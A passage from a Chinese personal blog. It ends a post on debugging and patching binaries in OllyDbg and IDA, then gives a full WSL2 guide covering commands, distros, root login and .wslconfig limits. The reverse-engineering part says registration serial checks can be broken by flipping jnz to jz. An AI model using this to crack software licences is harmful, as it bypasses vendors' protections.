<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707193913865.png" alt="image-20220707193913865"></p>
<p>一定要选择使用NOP填充,因为运行时各种寻址已经确定,如果我们修改的汇编指令比原指令短,则从该指令以后的所有指令地址都会移动,各种寻址方式就寄了</p>
<p>这里修改指令带来的影响是永久的,即直接修改了可执行文件中的二进制代码,下一次运行本程序还会带着本次的修改</p>
<p>破解序列号注册程序时往往把jnz改成jz就可以让序列号判断寄掉</p>
<h4 id="改寄存器"><a href="#改寄存器" class="headerlink" title="改寄存器"></a>改寄存器</h4><p>比如修改状态寄存器ZF,双击其数值就可以从0改到1或者从1改到0,后续的计算都是基于修改后的值</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707194243839.png" alt="image-20220707194243839"></p>
<p>也可以修改其他寄存器,比如程序计数器esp</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707194718167.png" alt="image-20220707194718167"></p>
<p>修改之后堆栈区的当前栈顶指针也会跟着改</p>
<blockquote>
<p>有一个寄存器没法改,那就是eip程序计数器</p>
</blockquote>
<p>修改寄存器造成的影响是临时的,仅限于本次程序执行,当程序重新执行时没有影响</p>
<h4 id="改堆栈"><a href="#改堆栈" class="headerlink" title="改堆栈"></a>改堆栈</h4><p>比如可以把sub_401000的返回地址改成sub_401000的入口地址,ret2text?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707195024065.png" alt="image-20220707195024065"></p>
<p>改堆栈也是临时的</p>
<h2 id="IDA动态调试wsample01b-exe"><a href="#IDA动态调试wsample01b-exe" class="headerlink" title="IDA动态调试wsample01b.exe"></a>IDA动态调试wsample01b.exe</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201135306.png" alt="image-20220707201135306"></p>
<p>首先要选择调试器</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201155743.png" alt="image-20220707201155743"></p>
<p>说是选择,然而只有一个Local Windows debugger可以用,其他的都找不到,没安装</p>
<p>选好之后下断点</p>
<p>比如在winmain第一行下断点</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201428364.png" alt="image-20220707201428364"></p>
<p>此后按下F9就开始动态调试了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707201704143.png" alt="image-20220707201704143"></p>
<p>各种快捷键都与ollydbg相似,包括F7单步步入,F8单步步过等等</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/23/wsl/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/23/wsl/" class="post-title-link" itemprop="url">WSL2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-23 22:44:00" itemprop="dateCreated datePublished" datetime="2022-06-23T22:44:00+08:00">2022-06-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-02 23:13:16" itemprop="dateModified" datetime="2024-09-02T23:13:16+08:00">2024-09-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="WSL2"><a href="#WSL2" class="headerlink" title="WSL2"></a>WSL2</h1><p>Windows Subsystem for Linux,在windows上运行的linux子系统</p>
<p>前一段时间一直在用WSL kali+vscode+python3,做pwn的题目还有linux上的逆向题.确实比用vmware开一个虚拟机方便一万倍</p>
<p>但是对wsl的了解也就仅限于一些简单的命令比如<code>ls </code>等等,对于子系统和主系统的网络关系,以及子系统的其他用法,没有了解过</p>
<p>现在想了解一下子系统的结构,怎么用子系统完成操作系统的课程实验(编译内核,系统调用,内核模块,设备驱动)</p>
<p>以及如何修改子系统的各种设置,比如防火墙,与主机的网络关系,网络发现等</p>
<p>随性更新…</p>
<h2 id="安装-卸载wsl"><a href="#安装-卸载wsl" class="headerlink" title="安装&#x2F;卸载wsl"></a>安装&#x2F;卸载wsl</h2><h3 id="安装wsl"><a href="#安装wsl" class="headerlink" title="安装wsl"></a>安装wsl</h3><p>后面的实验都是基于WSL2已经安装完成,kali子系统已经能够在终端上运行了.安装wsl可以去微软官网(这部分已经被翻译过了),要添加windows功能</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220622193653802.png" alt="image-20220622193653802"></p>
<p>具体参考<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/wsl/basic-commands">WSL 的基本命令 | Microsoft Docs</a></p>
<p>在微软应用市场上可以下载各种linux系统,比如ubuntu18.04和ubuntu20.04,kali,debian等等</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220622191626686.png" alt="image-20220622191626686"></p>
<p>更方便的方法是在命令行上</p>
<p><strong>查看本机已安装子系统</strong></p>
<p><code>wsl -l </code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali<span class="literal">-linux</span> (默认)</span><br><span class="line">Ubuntu</span><br></pre></td></tr></table></figure>



<p><strong>查看可以安装的子系统</strong></p>
<p><code>wsl -l -o</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-l</span> <span class="literal">-o</span></span><br><span class="line">以下是可安装的有效分发的列表。</span><br><span class="line">请使用“wsl <span class="literal">--install</span> <span class="literal">-d</span> &lt;分发&gt;”安装。</span><br><span class="line"></span><br><span class="line">NAME            FRIENDLY NAME</span><br><span class="line">Ubuntu          Ubuntu</span><br><span class="line">Debian          Debian GNU/Linux</span><br><span class="line">kali<span class="literal">-linux</span>      Kali Linux Rolling</span><br><span class="line">openS<span class="built_in">USE-42</span>     openSUSE Leap <span class="number">42</span></span><br><span class="line">SLES<span class="literal">-12</span>         SUSE Linux Enterprise Server v12</span><br><span class="line">Ubuntu<span class="literal">-16</span>.<span class="number">04</span>    Ubuntu <span class="number">16.04</span> LTS</span><br><span class="line">Ubuntu<span class="literal">-18</span>.<span class="number">04</span>    Ubuntu <span class="number">18.04</span> LTS</span><br><span class="line">Ubuntu<span class="literal">-20</span>.<span class="number">04</span>    Ubuntu <span class="number">20.04</span> LTS</span><br></pre></td></tr></table></figure>



<p><strong>设置默认的wsl</strong></p>
<p><code>wsl --set-default &lt;子系统名&gt;</code></p>
<p>在powershell中使用wsl命令时,有一个默认使用的子系统,比如我现在默认使用kali-linux,当终端上直接输入wsl时默认唤醒kali-linux,而不是ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl --set-default ubuntu</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -l</span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">Ubuntu (默认)</span><br><span class="line">kali-linux</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl --set-default kali-linux</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -l</span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali-linux (默认)</span><br><span class="line">Ubuntu</span><br></pre></td></tr></table></figure>

<h3 id="卸载子系统"><a href="#卸载子系统" class="headerlink" title="卸载子系统"></a>卸载子系统</h3><p>在微软应用商店里是木法卸载子系统的,在终端上行</p>
<p><code>wsl --unregister &lt;子系统名&gt;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">--unregister</span> ubuntu</span><br><span class="line">正在注销...</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali<span class="literal">-linux</span> (默认)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>三炮!</p>
<p>出去!</p>
</blockquote>
<h2 id="唤醒-关闭wsl"><a href="#唤醒-关闭wsl" class="headerlink" title="唤醒&#x2F;关闭wsl"></a>唤醒&#x2F;关闭wsl</h2><h3 id="选择唤醒哪一个子系统"><a href="#选择唤醒哪一个子系统" class="headerlink" title="选择唤醒哪一个子系统"></a>选择唤醒哪一个子系统</h3><p><code>wsl -d &lt;子系统名&gt;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">-d</span> ubuntu</span><br><span class="line">ubuntu@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn<span class="variable">$</span></span><br></pre></td></tr></table></figure>



<h3 id="选择登录用户"><a href="#选择登录用户" class="headerlink" title="选择登录用户"></a>选择登录用户</h3><p><code>wsl -u &lt;用户名&gt;</code></p>
<p>比如可以选择使用root登录系统,也可以使用普通用户登录系统.</p>
<p>只要是从powershell上唤醒子系统,不需要输入登录密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -u root</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “touch ~/.hushlogin” to hide this message)</span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn]</span><br><span class="line">└─# exit</span><br><span class="line">logout</span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl -u kali</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “touch ~/.hushlogin” to hide this message)</span><br></pre></td></tr></table></figure>

<h3 id="设置默认登录用户"><a href="#设置默认登录用户" class="headerlink" title="设置默认登录用户"></a>设置默认登录用户</h3><p>kali的默认登录用户是普通用户,权限有限.现在想要将默认登录用户改成root,如此不需要su或者sudo再输入密码</p>
<p><code>&lt;子系统名&gt; config --default-user &lt;用户名&gt;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; kali config <span class="literal">--default-user</span> root</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; kali</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common<span class="literal">-minimum-setup</span>/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “touch ~/.hushlogin” to hide this message)</span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="查看子系统内核版本wsl-status"><a href="#查看子系统内核版本wsl-status" class="headerlink" title="查看子系统内核版本wsl --status"></a>查看子系统内核版本<code>wsl --status</code></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn&gt; wsl <span class="literal">--status</span></span><br><span class="line">默认分发：kali<span class="literal">-linux</span></span><br><span class="line">默认版本：<span class="number">2</span></span><br><span class="line"></span><br><span class="line">适用于 Linux 的 Windows 子系统最后更新于 <span class="number">2022</span>/<span class="number">4</span>/<span class="number">21</span></span><br><span class="line">适用于 Linux 的 Windows 子系统内核可以使用“wsl <span class="literal">--update</span>”手动更新，但由于你的系统设置，无法进行自动更新。</span><br><span class="line"> 若要接收自动内核更新，请启用 Windows 更新设置:“在更新 Windows 时接收其他 Microsoft 产品的更新”。</span><br><span class="line"> 有关详细信息，请访问https://aka.ms/wsl2kernel。</span><br><span class="line">Windows 更新已暂停。</span><br><span class="line"></span><br><span class="line">内核版本： <span class="number">5.10</span>.<span class="number">102.1</span></span><br></pre></td></tr></table></figure>

<h3 id="子系统关机"><a href="#子系统关机" class="headerlink" title="子系统关机"></a>子系统关机</h3><p>关闭子系统所在的终端并不会关闭wsl,它会在后台运行,因此下一次打开wsl的时候会发现开启的很快.</p>
<p>在powershell上使用<code>wsl --shutdown</code>就可以关闭所有在后台运行的子系统</p>
<p>如果不想关闭所有后台子系统,只停止其中的某一个,可以<code>wsl --terminate &lt;子系统名&gt;</code></p>
<h2 id="工作目录"><a href="#工作目录" class="headerlink" title="工作目录"></a>工作目录</h2><h3 id="windows下wsl的位置"><a href="#windows下wsl的位置" class="headerlink" title="windows下wsl的位置"></a>windows下wsl的位置</h3><p><code>\\wsl.localhost\kali-linux</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali<span class="literal">-linux</span>&gt; <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Path</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali<span class="literal">-linux</span></span><br></pre></td></tr></table></figure>

<p>这到底是个啥地方呢?前面怎么好长一坨,FileSystem后面还有俩冒号</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>&gt; <span class="built_in">cd</span> \\wsl.localhost\kali<span class="literal">-linux</span></span><br><span class="line"><span class="built_in">PS</span> Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali<span class="literal">-linux</span>&gt;</span><br></pre></td></tr></table></figure>

<p>如果在这个目录下面,想使用cd ..退到爹目录,接着说找不到爹目录</p>
<p>实际上可以直接用explorer访问wsl的文件系统</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716105512580.png" alt="image-20220716105512580"></p>
<h3 id="wsl上windows的位置"><a href="#wsl上windows的位置" class="headerlink" title="wsl上windows的位置"></a>wsl上windows的位置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn]</span><br><span class="line">└─# <span class="built_in">pwd</span></span><br><span class="line">/mnt/c/Users/86135/Desktop/pwn</span><br></pre></td></tr></table></figure>

<p>即windows的根目录在wsl上为<code>/mnt/</code></p>
<p>比如桌面就是<code>/mnt/c/Users/86135/Desktop/</code></p>
<p>D盘就是<code>/mnt/d/</code></p>
<h2 id="共享环境变量"><a href="#共享环境变量" class="headerlink" title="共享环境变量"></a>共享环境变量</h2><p>在wsl上可以调用windows的环境变量中的应用程序</p>
<p>不同于windows终端的是,wsl上调用win的应用需要.exe后缀</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# ipconfig</span><br><span class="line">-bash: ipconfig: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# ipconfig.exe</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>也可以用wsl打开主系统中已经添加到环境变量的窗口应用程序</p>
<p>也可以在wsl上调用主系统的cmd,切换到主系统的cmd终端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# cmd.exe</span><br><span class="line"><span class="string">&#x27;\\wsl.localhost\kali-linux\root&#x27;</span></span><br><span class="line">用作为当前目录的以上路径启动了 CMD.EXE。</span><br><span class="line">UNC 路径不受支持。默认值设为 Windows 目录。</span><br><span class="line">Microsoft Windows [版本 10.0.22000.675]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Windows&gt;</span><br></pre></td></tr></table></figure>



<p>至于两个系统的终端怎么怎么联系.</p>
<p>这都是茴香豆的n种写法,不会有人闲的让终端之间踢皮球吧</p>
<p>并且还有设置开关这些功能,我寻思多多益善吧,不冲突关他干啥呢</p>
<h2 id="wsl执行linux命令"><a href="#wsl执行linux命令" class="headerlink" title="wsl执行linux命令"></a>wsl执行linux命令</h2><p>正常情况下,linux上的可执行程序.elf或者.out,在windows上是没法执行的.同理win上的.exe也无法在linux上执行</p>
<p>而wsl就提供了一种在windows上执行linux可执行目标文件的方法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用法: wsl.exe [参数] [选项...] [命令行]</span><br><span class="line"></span><br><span class="line">运行 Linux 二进制文件的参数:</span><br><span class="line"></span><br><span class="line">    如果未提供命令行，wsl.exe 将启动默认 shell。</span><br><span class="line"></span><br><span class="line">    --exec, -e &lt;命令行&gt;</span><br><span class="line">        在不使用默认 Linux Shell 的情况下执行指定的命令。</span><br><span class="line"></span><br><span class="line">    --</span><br><span class="line">        按原样传递其余命令行。</span><br></pre></td></tr></table></figure>

<p>比如</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn&gt; ls -l</span><br><span class="line">Get-ChildItem : 缺少参数“LiteralPath”的某个参数。请指定一个类型为“System.String[]”的参数，然后再试一次。</span><br><span class="line">所在位置 行:1 字符: 4</span><br><span class="line">+ ls -l</span><br><span class="line">+    ~~</span><br><span class="line">    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem]，ParameterBindingException</span><br><span class="line">    + FullyQualifiedErrorId : MissingArgument,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line"></span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl ls -l</span><br><span class="line">total 108</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun  2 19:52 CGfsb</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 19 23:14 cgpwn</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 20 09:55 dice_game</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 19 23:09 forgot</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 17:45 get_shell</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 20 09:28 guess_num</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 09:51 hello_pwn</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 20 08:45 int_overflow</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 17:38 level0</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 21:08 level2</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun  3 16:27 level3</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 21 10:30 mytest</span><br><span class="line">-rwxrwxrwx 1 kali kali 84286 Jun  3 16:10 pwn.md</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 19 23:38 reactor</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 20 00:28 realtime</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 20 10:06 stack2</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun  3 10:56 string</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 29 16:03 testPIE</span><br></pre></td></tr></table></figure>

<p>在输入<code>wsl ls -l</code>命令之后终端等了好长时间去了,推测是启动子系统去了.</p>
<p>估计这个过程就是在子系统上运行了<code>ls -l</code>命令之后,将结果反馈给powershell,然后powershell打印到屏幕上</p>
<h2 id="高级配置"><a href="#高级配置" class="headerlink" title="高级配置"></a>高级配置</h2><p>wsl上两个配置文件<code>wsl.conf</code> <code>.wslconfig</code></p>
<p>微软给出的这两个文件的描述</p>
<blockquote>
<p> <strong>wsl.conf</strong></p>
<ul>
<li>作为 unix 文件存储在 <code>/etc</code> 分发目录中。</li>
<li>用于按分布配置设置。 在此文件中配置的设置将仅应用于包含存储此文件的目录的特定 Linux 分发版。</li>
<li>可用于版本、WSL 1 或 WSL 2 运行的分发版。</li>
<li>若要访问已安装的发行版的 <code>/etc</code> 目录，请使用发行版的命令行和 <code>cd /</code> 访问根目录，然后使用 <code>ls</code> 列出文件或使用 <code>explorer.exe .</code> 在 Windows 文件资源管理器中查看。 目录路径应如下所示： <code>/etc/wsl.conf</code></li>
</ul>
<p> <strong>.wslconfig</strong></p>
<ul>
<li>存储在 <code>%UserProfile%</code> 目录中。</li>
<li>用于全局配置作为 WSL 2 版本运行的所有已安装 Linux 分发版的设置。</li>
<li>仅适用于 <strong>WSL 2 运行的分发</strong>版。 作为 WSL 1 运行的分发版不会受到此配置的影响，因为它们未作为虚拟机运行。</li>
<li>要访问 <code>%UserProfile%</code> 目录，请在 PowerShell 中使用 <code>cd ~</code> 访问主目录（通常是用户配置文件 <code>C:\Users\&lt;UserName&gt;</code>），或者可以打开 Windows 文件资源管理器并在地址栏中输入 <code>%UserProfile%</code>。 目录路径应如下所示： <code>C:\Users\&lt;UserName&gt;\.wslconfig</code></li>
</ul>
</blockquote>
<p>这两个文件在默认情况下是不存在的,只有我们需要修改wsl的参数时,才需要在相应位置建立这么一个文件.</p>
<p><code>wsl</code>再启动时就会考虑这些文件里的规定了</p>
<p><code>wsl.conf</code>放在子系统里</p>
<p><code>.wslconfig</code>放在主系统里.</p>
<p>在使用wmware的时候,我们可以自由决定虚拟机占用多大内存,最多使用多少个处理器,这就是<code>.wslconfig</code>的作用</p>
<p>在修改之前,首先在wsl上观察一下处理器数量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/cpuinfo | grep name | <span class="built_in">cut</span> -f2 -d: | <span class="built_in">uniq</span> -c</span><br><span class="line">     16  11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz</span><br></pre></td></tr></table></figure>

<p>wsl显示有16个,现在修改<code>.wslconfig</code>给他改成8个</p>
<p>观察一下总内存大小</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/meminfo | grep MemTotal</span><br><span class="line">MemTotal:       16262436 kB</span><br></pre></td></tr></table></figure>

<p>现在修改<code>.wslconfig</code>文件,调整上面两个值</p>
<p><code>C:\Users\86135\.wslconfig</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Settings apply across all Linux distros running on WSL 2</span></span><br><span class="line">[<span class="type">wsl2</span>]			<span class="comment">#正文第一行必须是[wsl2]这种标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Limits VM memory to use no more than 4 GB, this can be set as whole numbers using GB or MB</span></span><br><span class="line">memory=<span class="number">4</span>GB 	<span class="comment">#限制内存最大4G</span></span><br><span class="line">	</span><br><span class="line"><span class="comment"># Sets the VM to use two virtual processors</span></span><br><span class="line">processors=<span class="number">8</span>		<span class="comment">#设置8个处理器</span></span><br></pre></td></tr></table></figure>

<p>调整后保存,子系统重启,再打印观察</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/meminfo | grep MemTotal</span><br><span class="line">MemTotal:        4017200 kB</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/cpuinfo | grep name | <span class="built_in">cut</span> -f2 -d: | <span class="built_in">uniq</span> -c</span><br><span class="line">      8  11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz</span><br></pre></td></tr></table></figure>

<p>发现刚才的修改确实奏效了</p>
<h2 id="换下载源"><a href="#换下载源" class="headerlink" title="换下载源"></a>换下载源</h2><p>首先备份原来的源</p>
